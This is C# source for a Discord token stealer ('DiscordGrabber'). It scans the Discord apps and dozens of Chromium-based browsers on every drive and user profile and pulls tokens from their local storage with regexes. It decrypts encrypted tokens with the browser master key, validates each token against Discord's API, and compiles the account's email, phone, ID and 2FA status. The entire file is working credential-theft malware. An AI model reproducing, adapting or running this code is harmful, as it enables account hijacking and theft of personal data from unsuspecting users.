using System.Collections.Generic;
using System;
using System.Text.RegularExpressions;
using System.IO;
using System.DirectoryServices;
using System.Threading;
using LegitHttpClient;
using System.Text;
using System.Linq;
using System.Security.Cryptography;

using Newtonsoft.Json;

using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

public class DiscordGrabber
{
    private static ResourceSemaphore checkSemaphore;
    private static string grabbedTokens = "";
    private static int currentIndex = 0;
    private static List<Tuple<string, string>> grabbedDirectories = new List<Tuple<string, string>>()
    {
        { new Tuple<string, string>("Local\\Discord", "Discord") },
        { new Tuple<string, string>("Local\\Guilded", "Guilded") },
        { new Tuple<string, string>("Local\\Lightcord", "Lightcord") },
        { new Tuple<string, string>("Local\\discordptb", "Discord PTB") },
        { new Tuple<string, string>("Local\\discordcanary", "Discord Canary") },
        { new Tuple<string, string>("Local\\DiscordDevelopment", "Discord Development") },
        { new Tuple<string, string>("Local\\Opera Software\\Opera Stable", "Opera Browser") },
        { new Tuple<string, string>("Local\\Opera Software\\Opera GX Stable", "Opera GX Browser") },
        { new Tuple<string, string>("Local\\Amigo\\User Data\\Default", "Amigo Browser") },
        { new Tuple<string, string>("Local\\Torch\\User Data\\Default", "Torch Browser") },
        { new Tuple<string, string>("Local\\Kometa\\User Data\\Default", "Kometa Browser") },
        { new Tuple<string, string>("Local\\Orbitum\\User Data\\Default", "Orbitum Browser") },
        { new Tuple<string, string>("Local\\CentBrowser\\User Data\\Default", "Cent Browser") },
        { new Tuple<string, string>("Local\\7Star\\7Star\\User Data\\Default", "7Star Browser") },
        { new Tuple<string, string>("Local\\Sputnik\\Sputnik\\User Data\\Default", "Sputnik Browser") },
        { new Tuple<string, string>("Local\\Vivaldi\\User Data\\Default", "Vivaldi Browser") },
        { new Tuple<string, string>("Local\\Google\\Chrome Sxs\\User Data\\Default", "Chrome SxS Browser") },
        { new Tuple<string, string>("Local\\Vivaldi\\User Data\\Default", "Vivaldi Browser") },
        { new Tuple<string, string>("Local\\Google\\Epic Privacy Browser\\User Data\\Default", "Epic Privacy Browser") },
        { new Tuple<string, string>("Local\\Google\\Chrome\\User Data\\Default", "Google Chrome Browser") },
        { new Tuple<string, string>("Local\\uCozMedia\\Uran\\User Data\\Default", "uCozMedia Browser") },
        { new Tuple<string, string>("Local\\Microsoft\\Edge\\User Data\\Default", "Microsoft Edge Browser") },
        { new Tuple<string, string>("Local\\Yandex\\YandexBrowser\\User Data\\Default", "Yandex Browser") },
        { new Tuple<string, string>("Local\\Opera Software\\Opera Neon\\User Data\\Default", "Opera Neon Browser") },
        { new Tuple<string, string>("Local\\BraveSoftware\\Brave-Browser\\User Data\\Default", "Brave Browser") },
        { new Tuple<string, string>("Local\\Chromium\\User Data\\Default", "Chromium Browser") },
        { new Tuple<string, string>("Local\\Mail.Ru\\Atom\\User Data\\Default", "Atom Browser") },
        { new Tuple<string, string>("Local\\Comodo\\Dragon\\User Data\\Default", "Dragon Browser") },
        { new Tuple<string, string>("Local\\Slimjet\\User Data\\Default", "Slimjet Browser") },
        { new Tuple<string, string>("Local\\360Browser\\Browser\\User Data\\Default", "360 Browser") },
        { new Tuple<string, string>("Local\\Maxthon3\\User Data\\Default", "Maxthon3 Browser") },
        { new Tuple<string, string>("Local\\K-Meleon\\User Data\\Default", "K-Meleon Browser") },
        { new Tuple<string, string>("Local\\Nichrome\\User Data\\Default", "Nichrome Browser") },
        { new Tuple<string, string>("Local\\CocCoc\\Browser\\User Data\\Default", "CocCoc Browser") },
        { new Tuple<string, string>("Local\\Chromodo\\User Data\\Default", "Chromodo Browser") },

        { new Tuple<string, string>("Roaming\\Discord", "Discord") },
        { new Tuple<string, string>("Roaming\\Guilded", "Guilded") },
        { new Tuple<string, string>("Roaming\\Lightcord", "Lightcord") },
        { new Tuple<string, string>("Roaming\\discordptb", "Discord PTB") },
        { new Tuple<string, string>("Roaming\\discordcanary", "Discord Canary") },
        { new Tuple<string, string>("Roaming\\DiscordDevelopment", "Discord Development") },
        { new Tuple<string, string>("Roaming\\Opera Software\\Opera Stable", "Opera Browser") },
        { new Tuple<string, string>("Roaming\\Opera Software\\Opera GX Stable", "Opera GX Browser") },
        { new Tuple<string, string>("Roaming\\Amigo\\User Data\\Default", "Amigo Browser") },
        { new Tuple<string, string>("Roaming\\Torch\\User Data\\Default", "Torch Browser") },
        { new Tuple<string, string>("Roaming\\Kometa\\User Data\\Default", "Kometa Browser") },
        { new Tuple<string, string>("Roaming\\Orbitum\\User Data\\Default", "Orbitum Browser") },
        { new Tuple<string, string>("Roaming\\CentBrowser\\User Data\\Default", "Cent Browser") },
        { new Tuple<string, string>("Roaming\\7Star\\7Star\\User Data\\Default", "7Star Browser") },
        { new Tuple<string, string>("Roaming\\Sputnik\\Sputnik\\User Data\\Default", "Sputnik Browser") },
        { new Tuple<string, string>("Roaming\\Vivaldi\\User Data\\Default", "Vivaldi Browser") },
        { new Tuple<string, string>("Roaming\\Google\\Chrome Sxs\\User Data\\Default", "Chrome SxS Browser") },
        { new Tuple<string, string>("Roaming\\Vivaldi\\User Data\\Default", "Vivaldi Browser") },
        { new Tuple<string, string>("Roaming\\Google\\Epic Privacy Browser\\User Data\\Default", "Epic Privacy Browser") },
        { new Tuple<string, string>("Roaming\\Google\\Chrome\\User Data\\Default", "Google Chrome Browser") },
        { new Tuple<string, string>("Roaming\\uCozMedia\\Uran\\User Data\\Default", "uCozMedia Browser") },
        { new Tuple<string, string>("Roaming\\Microsoft\\Edge\\User Data\\Default", "Microsoft Edge Browser") },
        { new Tuple<string, string>("Roaming\\Yandex\\YandexBrowser\\User Data\\Default", "Yandex Browser") },
        { new Tuple<string, string>("Roaming\\Opera Software\\Opera Neon\\User Data\\Default", "Opera Neon Browser") },
        { new Tuple<string, string>("Roaming\\BraveSoftware\\Brave-Browser\\User Data\\Default", "Brave Browser") },
        { new Tuple<string, string>("Roaming\\Chromium\\User Data\\Default", "Chromium Browser") },
        { new Tuple<string, string>("Roaming\\Mail.Ru\\Atom\\User Data\\Default", "Atom Browser") },
        { new Tuple<string, string>("Roaming\\Comodo\\Dragon\\User Data\\Default", "Dragon Browser") },
        { new Tuple<string, string>("Roaming\\Slimjet\\User Data\\Default", "Slimjet Browser") },
        { new Tuple<string, string>("Roaming\\360Browser\\Browser\\User Data\\Default", "360 Browser") },
        { new Tuple<string, string>("Roaming\\Maxthon3\\User Data\\Default", "Maxthon3 Browser") },
        { new Tuple<string, string>("Roaming\\K-Meleon\\User Data\\Default", "K-Meleon Browser") },
        { new Tuple<string, string>("Roaming\\Nichrome\\User Data\\Default", "Nichrome Browser") },
        { new Tuple<string, string>("Roaming\\CocCoc\\Browser\\User Data\\Default", "CocCoc Browser") },
        { new Tuple<string, string>("Roaming\\Chromodo\\User Data\\Default", "Chromodo Browser") },
    };

    private static void AdjustDirectories()
    {
        List<Tuple<string, string>> toAdd = new List<Tuple<string, string>>();

        foreach (Tuple<string, string> tuple in grabbedDirectories)
        {
            if (tuple.Item1.Contains("\\Default"))
            {
                toAdd.Add(new Tuple<string, string>(tuple.Item1.Replace("\\Default", ""), tuple.Item2));
            }
        }

        grabbedDirectories.AddRange(toAdd);
    }

    public static string GetDiscordTokens()
    {
        checkSemaphore = new ResourceSemaphore();
        AdjustDirectories();
        List<Tuple<int, string, string, bool>> discordTokens = new List<Tuple<int, string, string, bool>>();
        int i = 0;

        string[] regexes = new string[]
        {
            @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
            @"mfa\.[\w-]{84}",
            @"[\w-]{24}\.[\w-]{6}\.[\w-]{38}"
        };

        foreach (Tuple<string, string> tuple in grabbedDirectories)
        {
            string directory = tuple.Item1, name = tuple.Item2;

            foreach (var drive in DriveInfo.GetDrives())
            {
                foreach (var user in FileUtils.GetComputerUsers())
                {
                    if (System.IO.Directory.Exists(drive + "\\Users\\" + user + "\\AppData\\" + directory + "\\Local Storage\\leveldb"))
                    {
                        foreach (string file in System.IO.Directory.GetFiles(drive + "\\Users\\" + user + "\\AppData\\" + directory + "\\Local Storage\\leveldb"))
                        {
                            string readFile = FileUtils.ReadFile(file);

                            foreach (string regex in regexes)
                            {
                                foreach (Match match in Regex.Matches(readFile, regex))
                                {
                                    string token = match.Value;
                                    bool exists = false;

                                    foreach (Tuple<int, string, string, bool> theToken in discordTokens)
                                    {
                                        if (theToken.Item3.Contains(token))
                                        {
                                            exists = true;
                                            break;
                                        }
                                    }

                                    if (!exists)
                                    {
                                        i++;
                                        discordTokens.Add(new Tuple<int, string, string, bool>(i, name, match.Value, false));
                                    }
                                }
                            }

                            foreach (Match match in Regex.Matches(readFile, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
                            {
                                string token = DecryptToken(Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), drive + "\\Users\\" + user + "\\AppData\\" + directory + "\\Local State");
                                bool exists = false;

                                foreach (Tuple<int, string, string, bool> theToken in discordTokens)
                                {
                                    if (theToken.Item3.Contains(token))
                                    {
                                        exists = true;
                                        break;
                                    }
                                }

                                if (!exists)
                                {
                                    i++;
                                    discordTokens.Add(new Tuple<int, string, string, bool>(i, name, token, true));
                                }
                            }
                        }
                    }
                }
            }
        }

        foreach (Tuple<int, string, string, bool> tuple in discordTokens)
        {
            Thread thread = new Thread(() => CheckToken(tuple.Item1, tuple.Item2, tuple.Item3, tuple.Item4));
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }

        while (currentIndex != discordTokens.Count)
        {
            Thread.Sleep(1000);
        }

        if (grabbedTokens != "")
        {
            grabbedTokens += Environment.NewLine + "================================================================================================";
        }

        return grabbedTokens;
    }

    private static void CheckToken(int index, string clientName, string token, bool wasEncrypted)
    {
        loop: while (checkSemaphore.IsResourceNotAvailable())
        {
            Thread.Sleep(1000);
        }

        if (checkSemaphore.IsResourceAvailable())
        {
            checkSemaphore.LockResource();

            HttpClient client = new HttpClient();
            client.ConnectTo("discord.com", true, 443);

            HttpRequest request = new HttpRequest();
            request.URI = "/api/v9/users/@me";
            request.Method = HttpMethod.GET;
            request.Version = HttpVersion.HTTP_11;

            request.Headers.Add(new HttpHeader() { Name = "Authorization", Value = token });
            request.Headers.Add(new HttpHeader() { Name = "Host", Value = "discord.com" });

            string response = BodyUtils.GetCleanJSON(Encoding.UTF8.GetString(client.Send(request).Body));
            bool Valid = true;
            string ID = "", Username = "", Discriminator = "", Locale = "", MFAEnabled = "", Email = "", Verified = "", Phone = "";

            if (response == "{\"message\": \"401: Unauthorized\", \"code\": 0}")
            {
                Valid = false;
                ID = "/";
                Username = "/";
                Discriminator = "/";
                Locale = "/";
                MFAEnabled = "/";
                Email = "/";
                Verified = "/";
                Phone = "/";
            }
            else
            {
                dynamic jss = Newtonsoft.Json.Linq.JObject.Parse(response);
                ID = jss.id;
                Username = jss.username;
                Discriminator = jss.discriminator;
                Locale = jss.locale;
                MFAEnabled = (string)jss.mfa_enabled;
                Email = jss.email;
                Verified = (string)jss.verified;
                Phone = jss.phone;

                if (Email == null)
                {
                    Email = "/";
                }

                if (Phone == null)
                {
                    Phone = "/";
                }
            }

            string theStr = "================================================================================================\r\n" +
                "Token: " + token + "\r\n" +
                "Was encrypted: " + wasEncrypted.ToString() + "\r\n" +
                "Valid: " + Valid.ToString() + "\r\n" +
                "Client name: " + clientName + "\r\n" +
                "ID: " + ID + "\r\n" +
                "Username: " + Username + "\r\n" +
                "Discriminator: " + Discriminator + "\r\n" +
                (Valid ?
                "Complete username: " + Username + "#" + Discriminator + "\r\n" : "Complete username: /\r\n") +
                "Locale: " + Locale + "\r\n" +
                "2FA enabled: " + MFAEnabled.ToString() + "\r\n" +
                "Email: " + Email + "\r\n" +
                "Verified: " + Verified.ToString() + "\r\n" +
                "Phone: " + Phone;

            if (grabbedTokens == "")
            {
                grabbedTokens = theStr;
            }
            else
            {
                grabbedTokens += "\r\n" + theStr;
            }

            currentIndex++;
            checkSemaphore.UnlockResource();
        }
        else
        {
            goto loop;
        }
    }

    private static byte[] GetMasterKey(string path)
    {
        dynamic jsonKey = JsonConvert.DeserializeObject(File.ReadAllText(path));
        return ProtectedData.Unprotect(Convert.FromBase64String((string)jsonKey.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
    }

    private static string DecryptToken(byte[] buffer, string path)
    {
        byte[] encrypted = buffer.Skip(15).ToArray();
        var cipher = new GcmBlockCipher(new AesEngine());
        cipher.Init(false, new AeadParameters(new KeyParameter(GetMasterKey(path)), 128, buffer.Skip(3).Take(12).ToArray(), null));
        var decryptedBytes = new byte[cipher.GetOutputSize(encrypted.Length)];
        cipher.DoFinal(decryptedBytes, cipher.ProcessBytes(encrypted, 0, encrypted.Length, decryptedBytes, 0));
        return Encoding.UTF8.GetString(decryptedBytes).TrimEnd("\r\n\0".ToCharArray());
    }
}